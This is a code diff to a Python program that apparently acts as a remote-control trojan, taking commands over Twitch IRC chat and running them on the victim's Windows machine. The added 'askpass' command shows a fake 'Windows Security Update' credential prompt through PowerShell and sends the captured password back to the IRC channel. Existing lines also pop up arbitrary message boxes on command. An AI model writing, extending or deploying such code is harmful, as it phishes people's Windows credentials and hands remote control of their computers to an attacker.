@@ -5,6 +5,7 @@ import os
 import urllib.request
 import smtplib, ssl
 import platform
+import subprocess
 
 HOST = "irc.twitch.tv"
 PORT = 6667
@@ -92,6 +93,15 @@ def main():
                             command = 'powershell "(new-object -ComObject wscript.shell).Popup(\\"{}\\",0,\\"Windows\\")"'.format(messageArray[3])
                             os.system(command)
                             chat(s, clientName + " completed the command.")
+                        except Exception as e:
+                            chat(s, clientName + " encountered an error. " + str(e))
+                    elif messageArray[2] == 'askpass':
+                        try:
+                            cmd1 = "$cred=$host.ui.promptforcredential('Windows Security Update','',[Environment]::UserName,[Environment]::UserDomainName);"
+                            cmd2 = 'echo $cred.getnetworkcredential().password;'
+                            full_cmd = 'Powershell "{} {}"'.format(cmd1, cmd2)
+                            test = subprocess.check_output(full_cmd, shell=True);
+                            chat(s, clientName + " returned password " + str(test, 'utf-8'))
                         except Exception as e:
                             chat(s, clientName + " encountered an error. " + str(e))
                     else:
